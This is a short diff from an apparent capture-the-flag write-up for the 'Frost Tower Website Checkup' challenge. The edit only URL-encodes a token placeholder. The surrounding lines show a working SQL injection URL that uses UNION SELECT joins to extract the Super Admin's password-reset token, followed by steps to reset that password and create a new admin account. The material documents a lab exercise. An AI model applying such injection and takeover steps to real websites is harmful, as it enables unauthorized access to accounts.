@@ -136,7 +136,7 @@ The token for the Super Admin "root@localhost" can be retrieved using this URL:
 https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a join (select 2)b join (select 3)c join (select token from users where email="root@localhost")d join (select 4)e join (select 5)f join (select 6)g;--
 ```
 
-Using the URL https://staging.jackfrosttower.com/forgotpass/token/{retrieved token} it is possible to set a new password for the "Super Admin" user.
+Using the URL https://staging.jackfrosttower.com/forgotpass/token/{retrieved%20token} it is possible to set a new password for the "Super Admin" user.
 Being logged on as this user, a new personalized user with "Super Admin" privileges can be created.
 
 **Achievement: Frost Tower Website Checkup**
